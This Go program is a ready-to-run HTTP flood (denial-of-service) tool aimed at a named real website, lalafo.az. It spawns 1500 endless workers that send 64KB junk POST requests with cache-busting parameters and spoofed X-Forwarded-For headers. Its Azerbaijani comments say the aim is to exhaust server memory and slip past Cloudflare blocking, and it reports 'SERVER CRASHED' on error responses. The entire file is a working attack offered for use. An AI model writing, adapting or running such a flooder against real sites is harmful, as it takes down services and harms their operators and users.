package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
)

func main() {
	target := "https://lalafo.az"
	workers := 1500 // Railway limitinə yaxın maksimum güc
	
	fmt.Printf("[!!!] HAKAI-FORCE DEVRƏDƏ: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns: 10000,
		MaxIdleConnsPerHost: 5000,
	}

	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			// Serverin RAM-ını doldurmaq üçün ağır payload
			payload := "data=" + strings.Repeat("X", 65536) // 64KB hər sorğuda
			
			for {
				u := fmt.Sprintf("%s/?bypass=%d&t=%d", target, rand.Intn(999999), time.Now().UnixNano())
				
				// POST sorğusu heç vaxt keşlənməz, birbaşa beyninə gedir
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

				resp, err := client.Do(req)
				if err == nil {
					if resp.StatusCode >= 500 {
						fmt.Printf("[WIN-%d] SERVER CRASHED: %d\n", id, resp.StatusCode)
					}
					resp.Body.Close()
				}
				// Cloudflare blokuna düşməmək üçün çox kiçik fasilə
				time.Sleep(5 * time.Millisecond)
			}
		}(i)
	}
	wg.Wait()
}
